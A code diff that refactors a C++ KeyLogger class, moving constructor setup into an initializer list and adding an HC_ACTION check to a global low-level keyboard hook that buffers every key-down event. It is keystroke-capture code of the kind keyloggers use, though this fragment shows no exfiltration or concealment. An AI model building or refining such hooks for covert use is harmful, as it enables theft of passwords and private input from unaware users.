@@ -11,10 +11,11 @@ KeyLogger* KeyLogger::GetInstance()
 	return m_pInstance;
 }
 
-KeyLogger::KeyLogger()
+KeyLogger::KeyLogger():
+	m_pBuffer(NULL),
+	m_pConverter(new VirtulKeyCodeToCharConverter()),
+	m_hhk(NULL)
 {
-	this->m_pBuffer = NULL;
-	this->m_pConverter = new VirtulKeyCodeToCharConverter();
 }
 
 KeyLogger::~KeyLogger(void)
@@ -35,15 +36,18 @@ Buffer* KeyLogger::GetBuffer()
 
 LRESULT CALLBACK KeyLogger::onKeybordEvent(int code,WPARAM wParam,LPARAM lParam) 
 {  
-	switch(wParam)
+	if (code == HC_ACTION)
 	{
-	case WM_KEYDOWN:		
-	case WM_SYSKEYDOWN:
-		KeyLogger::GetInstance()->addToBuffer((KBDLLHOOKSTRUCT*)lParam);
-	break;
-	case WM_KEYUP:
-	case WM_SYSKEYUP:
-		break;
+		switch(wParam)
+		{
+		case WM_KEYDOWN:		
+		case WM_SYSKEYDOWN:
+			KeyLogger::GetInstance()->addToBuffer((KBDLLHOOKSTRUCT*)lParam);
+			break;
+		case WM_KEYUP:
+		case WM_SYSKEYUP:
+			break;
+		}
 	}
 	
 	return CallNextHookEx( KeyLogger::GetInstance()->m_hhk ,code,wParam,lParam);
